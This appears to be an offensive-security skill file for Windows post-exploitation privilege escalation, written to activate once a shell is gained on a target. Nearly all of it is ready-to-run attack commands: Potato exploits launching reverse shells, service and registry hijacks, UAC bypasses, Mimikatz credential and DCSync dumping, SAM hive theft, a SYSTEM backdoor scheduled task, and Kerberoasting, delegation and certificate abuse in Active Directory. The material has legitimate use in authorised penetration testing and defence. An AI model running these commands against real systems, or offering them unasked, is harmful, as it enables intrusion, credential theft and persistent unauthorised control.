---
name: privesc-windows
description: Windows privilege escalation — token abuse, service exploitation, UAC bypass, credential harvesting, AD escalation paths
metadata:
  type: offensive
  phase: post-exploitation
  tools: winpeas, seatbelt, sharpup, rubeus, mimikatz, powerview, bloodhound
---

# Windows Privilege Escalation

## When to Activate

- Gained initial shell on Windows target, need SYSTEM/Admin
- Post-exploitation privilege escalation
- Active Directory privilege escalation
- UAC bypass scenarios

## Automated Enumeration

```powershell
# WinPEAS
.\winPEASx64.exe

# Seatbelt
.\Seatbelt.exe -group=all

# SharpUp
.\SharpUp.exe audit

# PowerUp
. .\PowerUp.ps1; Invoke-AllChecks
```

## Token Impersonation (SeImpersonatePrivilege)

```bash
# Check privileges
whoami /priv

# If SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege:
# Potato family exploits (NTLM relay to local SYSTEM)

# PrintSpoofer (Windows 10/Server 2016-2019)
PrintSpoofer.exe -i -c "cmd /c whoami"
PrintSpoofer.exe -c "C:\path\reverse_shell.exe"

# GodPotato (works on all Windows versions)
GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"

# SweetPotato
SweetPotato.exe -p C:\path\shell.exe
```

## Service Exploitation

```powershell
# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
# If path has spaces and no quotes: place binary at first space

# Weak service permissions
# Check with accesschk:
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
# If SERVICE_CHANGE_CONFIG:
sc config VulnService binpath= "C:\path\shell.exe"
sc stop VulnService && sc start VulnService

# Writable service binary
icacls "C:\Program Files\Service\binary.exe"
# If writable: replace with malicious binary, restart service

# DLL hijacking
# Process Monitor: filter for NAME NOT FOUND on DLL loads
# Place malicious DLL in searched path before legitimate one
```

## Registry Exploits

```powershell
# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# If both = 1: msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > shell.msi
msiexec /quiet /qn /i shell.msi

# AutoRun programs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# Check if any referenced binary is writable

# Stored credentials
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
cmdkey /list  # Stored Windows credentials
```

## UAC Bypass

```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# Fodhelper bypass (Windows 10)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe

# Eventvwr bypass
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe

# CMSTPLUA COM object
# Requires: medium integrity, local admin group member
```

## Credential Harvesting

```powershell
# Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:Administrator" "exit"

# SAM/SYSTEM backup
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
# Offline: impacket-secretsdump -sam sam.bak -system system.bak LOCAL

# DPAPI
mimikatz "dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\*"

# Cached credentials
mimikatz "lsadump::cache"

# Kerberos tickets
mimikatz "sekurlsa::tickets /export"
# Or Rubeus:
Rubeus.exe dump /nowrap
Rubeus.exe triage
```

## Scheduled Tasks

```powershell
# List tasks
schtasks /query /fo LIST /v | findstr /i "task\|run\|author"

# Check writable task binaries
# If task runs as SYSTEM with writable binary path:
# Replace binary → wait for execution

# Create task (if admin)
schtasks /create /tn "Backdoor" /tr "C:\path\shell.exe" /sc onlogon /ru SYSTEM
```

## Named Pipes & Impersonation

```powershell
# List named pipes
[System.IO.Directory]::GetFiles("\\.\pipe\")

# Create pipe server, wait for privileged client connection
# Impersonate connected client token
# Tools: PipeServerImpersonate, custom .NET
```

## AD-Specific Escalation

```powershell
# Kerberoasting
Rubeus.exe kerberoast /outfile:hashes.txt
hashcat -m 13100 hashes.txt wordlist.txt

# AS-REP Roasting
Rubeus.exe asreproast /outfile:asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt

# Constrained Delegation abuse
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target /ptt

# Resource-Based Constrained Delegation
# If GenericWrite on computer object:
# Add msDS-AllowedToActOnBehalfOfOtherIdentity
# Then S4U2Self + S4U2Proxy

# Shadow Credentials (if GenericWrite on user/computer)
Whisker.exe add /target:victim /domain:domain.com
Rubeus.exe asktgt /user:victim /certificate:cert.pfx /password:pass /ptt

# ADCS (Certificate Services)
Certify.exe find /vulnerable
Certify.exe request /ca:CA /template:VulnTemplate /altname:Administrator
```
